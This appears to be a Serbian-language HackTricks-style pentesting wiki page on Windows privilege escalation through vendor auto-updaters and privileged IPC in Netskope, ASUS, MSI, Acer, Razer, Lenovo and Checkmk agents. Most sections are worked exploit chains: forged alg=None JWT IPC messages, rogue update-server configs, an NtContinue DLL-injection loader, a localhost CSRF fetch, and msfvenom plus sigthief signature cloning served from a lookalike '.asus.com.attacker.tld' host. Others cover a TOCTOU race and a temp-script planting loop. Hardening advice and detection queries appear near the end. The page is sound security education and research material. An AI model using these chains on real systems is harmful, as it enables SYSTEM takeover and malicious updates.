# Zloupotreba Enterprise Auto-Updaters i privilegovanog IPC-a (npr. Netskope, ASUS i MSI)

{{#include ../../banners/hacktricks-training.md}}

Ova stranica uopštava klasu Windows lanaca za lokalnu eskalaciju privilegija pronađenih u enterprise endpoint agentima i updaterima koji izlažu lako dostupnu IPC površinu i privilegovani update tok. Reprezentativan primer je Netskope Client for Windows < R129 (CVE-2025-0309), gde korisnik sa niskim privilegijama može da iznudi enrollment ka serveru pod kontrolom napadača, a zatim isporuči maliciozni MSI koji SYSTEM servis instalira.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Ključne ideje koje možete ponovo koristiti protiv sličnih proizvoda:
- Zloupotrebite localhost IPC privilegovanog servisa da biste iznudili ponovni enrollment ili rekonfiguraciju ka serveru napadača.
- Implementirajte vendor-ove update endpoints, isporučite rogue Trusted Root CA i usmerite updater ka malicioznom, „potpisanom“ package-u.
- Zaobiđite slabe provere signer-a (CN allow-liste), opcione digest flags i labave MSI properties.
- Ako je IPC „encrypted“, izvedite key/IV iz machine identifier-a čitljivih svim korisnicima, koji su sačuvani u registry-ju.
- Ako servis ograničava pozivaoce na osnovu image path-a/process name-a, izvršite injection u allow-listed process ili pokrenite takav process u suspended stanju i učitajte DLL putem minimalne izmene thread context-a.

---
## 1) Iznuđivanje enrollment-a ka serveru napadača putem localhost IPC-a

Mnogi agenti isporučuju user-mode UI process koji komunicira sa SYSTEM servisom preko localhost TCP-a koristeći JSON.

Uočeno u Netskope-u:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit tok:
1) Kreirajte JWT enrollment token čiji claims kontrolišu backend host (npr. AddonUrl). Koristite alg=None kako potpis ne bi bio potreban.
2) Pošaljite IPC poruku koja poziva provisioning command sa vašim JWT-om i imenom tenant-a:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Servis počinje da kontaktira vaš rogue server radi enrollment/config, npr.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Napomene:
- Ako se verifikacija caller-a zasniva na path/name vrednostima, pokrenite zahtev iz allow-listed vendor binarnog fajla (pogledajte §4).<sup>[[1]](#references)[[2]](#references)</sup>

---
## 2) Hijacking update channel-a radi pokretanja koda kao SYSTEM

Kada client počne da komunicira sa vašim serverom, implementirajte očekivane endpoint-e i usmerite ga na attacker MSI. Tipičan sled:

1) /v2/config/org/clientconfig → Vratite JSON config sa veoma kratkim updater intervalom, npr.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Vrati PEM CA certificate. Service ga instalira u Trusted Root store za Local Machine.
3) /v2/checkupdate → Prosledi metadata koji upućuje na malicious MSI i lažnu verziju.

Zaobilaženje uobičajenih provera koje se mogu videti u praksi:
- Signer CN allow-list: service možda proverava samo da li Subject CN odgovara vrednosti “netSkope Inc” ili “Netskope, Inc.”. Tvoj rogue CA može izdati leaf sa tim CN-om i potpisati MSI.
- CERT_DIGEST property: uključi benignu MSI property pod nazivom CERT_DIGEST. Ne postoji enforcement prilikom instalacije.
- Optional digest enforcement: config flag (npr. check_msi_digest=false) onemogućava dodatnu cryptographic validation.

Rezultat: SYSTEM service instalira tvoj MSI iz
C:\ProgramData\Netskope\stAgent\data\*.msi
i izvršava proizvoljan kod kao NT AUTHORITY\SYSTEM.<sup>[[1]](#references)[[2]](#references)</sup>

Pouka o zaobilaženju patch-a: ako vendor reaguje tako što dozvoli mali skup “trusted” domena umesto da cryptographically authenticates izvor update-a, potraži vendor-owned redirectors ili reverse proxies koji ti i dalje omogućavaju usmeravanje saobraćaja. U Netskope-ovom slučaju, javno naknadno istraživanje pokazalo je da je allow-list iz R129 perioda i dalje mogao da se zloupotrebi preko `rproxy.goskope.com`, koji je prosleđivao sadržaj sa Azure App Service-a pod kontrolom napadača. Tretiraj hostname allow-lists kao prepreku za usporavanje, a ne kao trust boundary.<sup>[[14]](#references)</sup>

---
## 3) Falsifikovanje encrypted IPC zahteva (kada postoji)

Od R127, Netskope je umotao IPC JSON u polje encryptData koje izgleda kao Base64. Reversing je pokazao da se koristi AES, čiji se key/IV izvode iz registry vrednosti koje može da čita bilo koji user:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Napadači mogu reprodukovati encryption i slati validne encrypted komande kao standardni user.<sup>[[1]](#references)[[2]](#references)</sup> Opšti savet: ako agent iznenada počne da “encrypts” svoj IPC, potraži device IDs, product GUIDs i install IDs ispod HKLM-a koji se koriste kao materijal.

---
## 4) Zaobilaženje IPC caller allow-lista (provere putanje/naziva)

Neki services pokušavaju da authenticate peer tako što razrešavaju PID TCP connection-a i porede image path/name sa allow-listed vendor binaries smeštenim ispod Program Files (npr. stagentui.exe, bwansvc.exe, epdlp.exe).

Dva praktična bypass-a:
- DLL injection u allow-listed process (npr. nsdiag.exe) i proxy IPC iz njega.
- Pokreni allow-listed binary suspended i bootstrap-uj svoj proxy DLL bez CreateRemoteThread (pogledaj §5), kako bi zadovoljio driver-enforced tamper rules.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Injection prilagođen tamper-protection-u: suspended process + NtContinue patch

Products često isporučuju minifilter/OB callbacks driver (npr. Stadrv) koji uklanja opasna prava iz handles ka protected processes:
- Process: uklanja PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: ograničava na THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Pouzdan user-mode loader koji poštuje ova ograničenja:
1) CreateProcess vendor binary-ja sa CREATE_SUSPENDED.
2) Preuzmi handles koje ti je i dalje dozvoljeno da koristiš: PROCESS_VM_WRITE | PROCESS_VM_OPERATION nad process-om, kao i thread handle sa THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (ili samo THREAD_RESUME ako patch-uješ kod na poznatom RIP-u).
3) Prepiši ntdll!NtContinue (ili drugi early, guaranteed-mapped thunk) malim stub-om koji poziva LoadLibraryW nad putanjom do tvog DLL-a, a zatim se vraća nazad.
4) Pozovi ResumeThread da pokreneš svoj stub u process-u i učitaš DLL.

Pošto nikada nisi koristio PROCESS_CREATE_THREAD ili PROCESS_SUSPEND_RESUME nad već protected process-om (ti si ga kreirao), driver-ova policy je zadovoljena.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Praktični alati
- NachoVPN (Netskope plugin) automatizuje rogue CA, malicious MSI signing i posluživanje potrebnih endpoint-a: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope je custom IPC client koji kreira proizvoljne (opciono AES-encrypted) IPC poruke i uključuje suspended-process injection kako bi ih slao iz allow-listed binary-ja.<sup>[[4]](#references)</sup>

## 7) Brzi triage workflow za nepoznate updater/IPC površine

Kada naiđeš na novi endpoint agent ili “helper” suite za matičnu ploču, brzi workflow je obično dovoljan da utvrdiš da li gledaš u perspektivnu privesc metu:<sup>[[6]](#references)</sup>

1) Enumeriši loopback listeners i poveži ih sa vendor processes:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Izlistajte potencijalne named pipes:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Prikupite podatke o rutiranju zasnovane na registru koje koriste IPC serveri zasnovani na pluginovima:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Najpre izvucite nazive endpointa, JSON ključeve i ID-jeve komandi iz user-mode klijenta. Packed Electron/.NET frontend aplikacije često leak-uju celu šemu:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) Potražite stvarni uslov poverenja, a ne samo putanju koda koja na kraju pokreće proces:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
Obrasci kojima vredi dati prioritet:
- `CryptQueryObject`/parsiranje sertifikata bez `WinVerifyTrust` obično znači da je „sertifikat postoji“ tretirano kao „sertifikat je pouzdan“, što omogućava certificate cloning ili druge fake-signer trikove.
- Provere podniski/sufiksa nad vrednostima `Origin`, `Referer`, URL-ovima za preuzimanje, imenima procesa ili CN-ovima potpisnika nisu autentikacija. `contains(".vendor.com")` je obično exploitable pomoću domena sličnih domenima pod kontrolom napadača.
- Ako low-privileged GUI odlučuje da je „fajl pouzdan“, a SYSTEM broker samo koristi taj rezultat, patching ili reimplementacija client-side DLL/JS-a često u potpunosti zaobilazi granicu (Razer-style split validation).
- Ako broker kopira payload u `%TEMP%`/`C:\Windows\Temp`, a zatim ga validira ili zakazuje iz te putanje, odmah testirajte TOCTOU replacement windows i sibling plugin modules koji izlažu alternativne `ExecuteTask()` wrappers sa slabijim proverama.<sup>[[6]](#references)</sup>

Za targete koji intenzivno koriste named pipe-ove, PipeViewer je brz način da uočite slabe DACL-ove i pipe-ove kojima je moguće pristupiti sa udaljene lokacije, pre nego što počnete detaljno da reverse-ujete protokol.<sup>[[11]](#references)</sup>

Ako target autentikuje pozivaoce samo na osnovu PID-a, putanje image-a ili imena procesa, tretirajte to kao usporenje, a ne kao granicu: injecting u legitimni klijent ili uspostavljanje konekcije iz procesa koji se nalazi na allow-listi često je dovoljno da se zadovolje provere servera. Konkretno za named pipe-ove, [ova stranica o impersonation-u klijenta i zloupotrebi pipe-ova](named-pipe-client-impersonation.md) detaljnije obrađuje ovaj primitive.

---
## 8) Modularni add-in brokeri koji se autentikuju samo pomoću potpisa vendora (Lenovo Vantage pattern)

Novija varijanta koju vredi tražiti je **signed-client RPC broker**: low-privileged desktop proces potpisan od strane Lenovo-a komunicira sa SYSTEM servisom, a servis prosleđuje JSON komande skupu add-in-ova opisanih XML-om u `%ProgramData%`. Kada se code execution postigne **unutar bilo kog prihvaćenog signed client-a**, svaki ugovor sa `runas="system"` postaje deo vaše attack surface.<sup>[[15]](#references)</sup>

High-value primitive-i uočeni tokom Lenovo Vantage research-a:
- **Verovanje pozivaocu zato što je potpisan od strane vendora**: istraživači su dobili authenticated context kopiranjem Lenovo-signed EXE-a u writable direktorijum i zadovoljavanjem DLL side-load-a (`profapi.dll`), tako da se arbitrary code izvršavao unutar klijenta kojem je servis već verovao.
- **Manifest-driven otkrivanje attack surface-a**: add-in-ovi se deklarišu u `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; nekoliko ugovora se izvršava kao `SYSTEM`, pa enumerisanje tih manifesta često otkriva stvarne privileged verb-ove brže nego reverse engineering samog brokera.
- **Greške po komandama iza authenticated channel-a**: nakon ulaska u trusted client, javno istraživanje je otkrilo path-traversal + race condition-e u update/install verb-ovima, raw-SQL abuse u privileged settings bazama i substring-based provere registry putanja koje su omogućile upis van predviđenog hive-a.

Korisni recon na targetu:
```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
-Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```
Praktična pouka: kad god helper suite izlaže broker koji najpre autentifikuje **caller process**, a zatim prosleđuje zahteve desetinama plugin/add-in komandi, nemojte stati nakon zaobilaženja provere poverenja na ulaznoj tački. Preuzmite manifest/contract tabelu i fuzz-ujte svaki high-privilege verb nezavisno; autentifikovani kanal obično skriva nekoliko bugova u drugoj fazi.

---
## 1) Browser-to-localhost CSRF protiv privilegovanih HTTP API-ja (ASUS DriverHub)

DriverHub isporučuje user-mode HTTP servis (ADU.exe) na 127.0.0.1:53000 koji očekuje browser pozive sa adrese https://driverhub.asus.com. Origin filter jednostavno izvršava `string_contains(".asus.com")` nad Origin headerom i download URL-ovima izloženim preko `/asus/v1.0/*`. Zato svaki host pod kontrolom napadača, kao što je `https://driverhub.asus.com.attacker.tld`, prolazi proveru i može da šalje state-changing zahteve iz JavaScript-a.<sup>[[6]](#references)</sup> Pogledajte [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) za dodatne obrasce zaobilaženja.

Praktičan tok:
1) Registrujte domen koji sadrži `.asus.com` i na njemu hostujte malicious web stranicu.
2) Koristite `fetch` ili XHR za pozivanje privilegovanog endpoint-a (npr. `Reboot`, `UpdateApp`) na `http://127.0.0.1:53000`.
3) Pošaljite JSON telo koje handler očekuje – packed frontend JS prikazuje šemu u nastavku.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Čak i PowerShell CLI prikazan u nastavku uspeva kada se Origin zaglavlje lažira na pouzdanu vrednost:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Svaka poseta browsera napadačkom sajtu stoga postaje local CSRF sa 1 klikom (ili sa 0 klikova putem `onload`) koji pokreće SYSTEM helper.

---
## 2) Nesigurna verifikacija code-signing-a i kloniranje sertifikata (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` preuzima proizvoljne izvršne fajlove definisane u JSON telu i kešira ih u `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Validacija URL-a za preuzimanje ponovo koristi istu substring logiku, pa se `http://updates.asus.com.attacker.tld:8000/payload.exe` prihvata. Nakon preuzimanja, ADU.exe samo proverava da PE sadrži potpis i da se Subject string podudara sa ASUS pre nego što ga pokrene – nema `WinVerifyTrust`, niti validacije lanca.

Za weaponize ovog toka:
1) Kreirajte payload (npr. `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Klonirajte ASUS signer u njega (npr. `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Hostujte `pwn.exe` na lookalike domenu `.asus.com` i pokrenite UpdateApp putem prethodno navedenog browser CSRF-a.

Pošto su i Origin i URL filteri zasnovani na substring proveri, a provera signer-a samo upoređuje stringove, DriverHub preuzima i izvršava napadački binary u okviru svojih povišenih privilegija.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU unutar putanja za kopiranje/izvršavanje updater-a (MSI Center CMD_AutoUpdateSDK)

SYSTEM servis aplikacije MSI Center izlaže TCP protokol u kojem je svaki frame oblika `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Osnovna komponenta (Component ID `0f 27 00 00`) sadrži `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Njen handler:
1) Kopira prosleđeni executable u `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifikuje potpis putem `CS_CommonAPI.EX_CA::Verify` (subject sertifikata mora biti jednak vrednosti “MICRO-STAR INTERNATIONAL CO., LTD.”, a `WinVerifyTrust` mora uspešno da se izvrši).
3) Kreira scheduled task koji pokreće temp fajl kao SYSTEM, sa argumentima koje kontroliše napadač.

Kopirani fajl nije zaključan između verifikacije i `ExecuteTask()`. Napadač može da:
- Pošalje Frame A koji pokazuje na legitimni MSI-signed binary (čime garantuje da će provera potpisa proći i da će task biti stavljen u red).
- Utrkuje ga ponavljanim Frame B porukama koje pokazuju na malicious payload i prepisuju `MSI Center SDK.exe` odmah nakon završetka verifikacije.

Kada scheduler pokrene task, on izvršava prepisani payload pod SYSTEM privilegijama, iako je prvobitno verifikovan originalni fajl. Pouzdana eksploatacija koristi dve goroutine/thread niti koje spam-uju CMD_AutoUpdateSDK dok se ne dobije TOCTOU trka.<sup>[[6]](#references)</sup>

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Svaki plugin/DLL koji učita `MSI.CentralServer.exe` dobija Component ID sačuvan pod `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Prva 4 bajta frame-a biraju tu komponentu, što napadačima omogućava usmeravanje komandi ka proizvoljnim modulima.
- Plugin-i mogu da definišu sopstvene task runner-e. `Support\API_Support.dll` izlaže `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` i direktno poziva `API_Support.EX_Task::ExecuteTask()` bez ikakve signature validacije – svaki lokalni user može da ga usmeri na `C:\Users\<user>\Desktop\payload.exe` i deterministički dobije SYSTEM execution.
- Sniffing loopback-a pomoću Wireshark-a ili instrumentacija .NET binary-ja u dnSpy-ju brzo otkriva mapiranje Component ↔ command; custom Go/ Python klijenti zatim mogu da replay-uju frame-ove.<sup>[[6]](#references)</sup>

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) izlaže `\\.\pipe\treadstone_service_LightMode`, a njegov discretionary ACL dozvoljava remote klijentima pristup (npr. `\\TARGET\pipe\treadstone_service_LightMode`). Slanje command ID-a `7` sa putanjom do fajla poziva service-ovu rutinu za pokretanje procesa.
- Client library serializuje magic terminator byte (113) zajedno sa argumentima. Dynamic instrumentation pomoću Frida/`TsDotNetLib` (pogledajte [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) za savete o instrumentation-u) pokazuje da native handler mapira ovu vrednost na `SECURITY_IMPERSONATION_LEVEL` i integrity SID pre pozivanja `CreateProcessAsUser`.
- Zamena vrednosti 113 (`0x71`) vrednošću 114 (`0x72`) prelazi u generic branch koji zadržava kompletan SYSTEM token i postavlja high-integrity SID (`S-1-16-12288`). Pokrenuti binary se zato izvršava kao unrestricted SYSTEM, i lokalno i između mašina.
- Kombinujte ovo sa izloženim installer flag-om (`Setup.exe -nocheck`) da biste pokrenuli ACC čak i na lab VM-ovima i testirali pipe bez hardware-a proizvođača.<sup>[[6]](#references)</sup>

Ovi IPC bug-ovi pokazuju zašto localhost servisi moraju da primenjuju mutual authentication (ALPC SIDs, `ImpersonationLevel=Impersonation` filtere, token filtering) i zašto svaki modulov helper za “run arbitrary binary” mora da koristi iste signer verifikacije.

---
## 3) COM/IPC “elevator” helper-i zasnovani na slaboj user-mode validaciji (Razer Synapse 4)

Razer Synapse 4 je dodao još jedan koristan pattern ovoj familiji: user sa niskim privilegijama može da zatraži od COM helper-a pokretanje procesa putem `RzUtility.Elevator`, dok se odluka o trust-u delegira user-mode DLL-u (`simple_service.dll`) umesto da se robusno sprovodi unutar privileged boundary-ja.

Uočeni exploitation path:
- Instancirajte COM objekat `RzUtility.Elevator`.
- Pozovite `LaunchProcessNoWait(<path>, "", 1)` da biste zatražili povišeno pokretanje.
- U javnom PoC-u, PE-signature gate unutar `simple_service.dll` se patch-uje pre slanja zahteva, čime se omogućava pokretanje proizvoljnog executable-a koji izabere napadač.<sup>[[6]](#references)</sup>

Minimalna PowerShell invocation:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
Opšti zaključak: prilikom reverse engineering-a „helper“ suite-ova nemojte se zaustaviti na localhost TCP-u ili named pipes. Proverite COM klase sa imenima kao što su `Elevator`, `Launcher`, `Updater` ili `Utility`, a zatim utvrdite da li privileged service zaista validira sam target binary ili samo veruje rezultatu koji izračunava patchable user-mode client DLL. Ovaj obrazac se može primeniti i van Razer-a: svaki split dizajn u kojem high-privilege broker preuzima allow/deny odluku sa low-privilege strane predstavlja potencijalnu privesc površinu.


---
## Predvidljivo izvršavanje privremenog script-a tokom MSI repair-a (Checkmk Agent / CVE-2024-0670)

Neki Windows agenti i dalje implementiraju privileged actions tako što upisuju privremeni `.cmd` u `C:\Windows\Temp` i izvršavaju ga kao `SYSTEM`. Ako je naziv datoteke predvidljiv, a service ne kreira bezbedno postojeće datoteke ponovo, low-privileged user može unapred kreirati buduću privremenu datoteku kao **read-only** i navesti privileged process da izvrši sadržaj pod kontrolom napadača umesto sopstvenog script-a.

Uočeno u ranjivim Checkmk Agent build-ovima:
- temp pattern: `cmk_all_<PID>_1.cmd`
- affected branches: `2.0.0`, `2.1.0`, `2.2.0`
- trigger: MSI **repair** keširanog agent package-a<sup>[[8]](#references)[[9]](#references)</sup>

Praktičan workflow:
1. Procenite realan PID range na osnovu trenutnih process ID-jeva ili PID-a pokrenutog agent-a.
2. Napišite kratak **ASCII** `.cmd` payload (`Set-Content -Encoding Ascii` ili preusmeravanje kroz `cmd.exe`; izbegavajte UTF-16 PowerShell output za batch files).
3. Distribuirajte `C:\Windows\Temp\cmk_all_<PID>_1.cmd` kroz kandidat range i označite svaku datoteku kao read-only.
4. Pokrenite repair keširanog MSI-ja tako da privileged service pokuša da ponovo generiše i zatim izvrši privremeni script.<sup>[[7]](#references)</sup>
```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```
Ako je ranjivi proizvod instaliran pomoću Windows Installer-a, mapirajte MSI datoteku sa nasumičnim nazivom iz keša pod `C:\Windows\Installer` na naziv proizvoda pre pokretanja popravke:<sup>[[7]](#references)</sup>
```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
ForEach-Object {
$p = Get-ItemProperty $_.PSPath
[PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
} | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```
Operativne napomene:
- `qwinsta` je koristan kada `msiexec /fa` ne uspe iz neinteraktivne WinRM shell sesije i potrebno je utvrditi da li postojeća desktop/diskonektovana sesija može pravilno da pokrene repair.<sup>[[7]](#references)</sup>
- Ovaj obrazac se može primeniti i na druge endpoint agente i updatere koji **postavljaju privremene skripte na world-writable lokacije i kasnije ih izvršavaju kao SYSTEM**. Testirajte predvidiva imena, nedostatak exclusive create semantike i repair/update tokove koji se mogu pokrenuti na zahtev.

---
## Remote supply-chain hijack putem slabe validacije updaterea (WinGUp / Notepad++)

Između juna 2025. i decembra 2025, napadači koji su kompromitovali hosting infrastrukturu iza Notepad++ update toka selektivno su posluživali zlonamerne manifeste odabranim žrtvama. Stariji updaterei zasnovani na WinGUp-u nisu u potpunosti proveravali autentičnost updatea, pa je neprijateljski XML odgovor mogao da preusmeri klijente na URL-ove pod kontrolom napadača. Pošto je klijent prihvatao HTTPS sadržaj bez zahteva da istovremeno postoje pouzdan certificate chain i važeći PE signature preuzetog installera, žrtve su preuzimale i izvršavale trojanizovani NSIS `update.exe`.<sup>[[12]](#references)[[13]](#references)</sup>

Operativni tok (nije potreban lokalni exploit):
1. **Infrastructure interception**: kompromitovati CDN/hosting i odgovarati na provere updatea metapodacima napadača koji upućuju na zlonamerni download URL.
2. **Trojanized NSIS**: installer preuzima/izvršava payload i zloupotrebljava dva execution chain-a:
- **Bring-your-own signed binary + sideload**: isporučiti potpisani Bitdefender `BluetoothService.exe` i postaviti zlonamerni `log.dll` u njegov search path. Kada se potpisani binary pokrene, Windows sideloaduje `log.dll`, koji dešifruje i reflectively učitava Chrysalis backdoor (zaštićen Warbird-om + API hashing radi otežavanja statičke detekcije).
- **Scripted shellcode injection**: NSIS izvršava kompajliranu Lua skriptu koja koristi Win32 API-je (npr. `EnumWindowStationsW`) za injection shellcode-a i postavljanje Cobalt Strike Beacon-a.<sup>[[12]](#references)</sup>

Zaključci za hardening/detekciju svakog auto-updatera:
- Zahtevajte **certificate + signature verification** preuzetog installera (pin-ujte vendor signer, odbijte neusklađeni CN/chain) i potpišite sam update manifest (npr. XMLDSig). Blokirajte redirects kontrolisane manifestom ukoliko nisu validirani.
- Tretirajte **BYO signed binary sideloading** kao detection pivot nakon download-a: generišite alert kada potpisani vendor EXE učita DLL ime izvan svog canonical install path-a (npr. Bitdefender učitava `log.dll` iz Temp/Downloads) i kada updater postavlja/izvršava installere iz temp direktorijuma sa non-vendor signatures.
- Pratite **malware-specific artifacts** uočene u ovom chain-u (korisne kao generički pivoti): mutex `Global\Jdhfv_1.0.1`, anomalne upise `gup.exe` u `%TEMP%` i Lua-driven shellcode injection faze.
- Notepad++ je odgovorio jačanjem WinGUp-a u verziji v8.8.9 i novijim verzijama: vraćeni XML je sada potpisan (XMLDSig), a novije verzije zahtevaju certificate + signature verification preuzetog installera umesto oslanjanja samo na transport.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> pokreće installer koji nije povezan sa Notepad++</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Ovi obrasci se mogu primeniti na svaki updater koji prihvata unsigned manifests ili ne ograničava signere instalera—network hijack + malicious installer + BYO-signed sideloading omogućavaju remote code execution pod maskom „pouzdanih“ ažuriranja.

---
## Reference
- [1] [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Local Privilege Escalation via writable files in Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Privilege escalation in Windows agent](https://checkmk.com/werk/16361)
- [10] [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Bypassing the fix for CVE-2025-0309 in Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Uncovering Privilege Escalation Bugs in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)

{{#include ../../banners/hacktricks-training.md}}
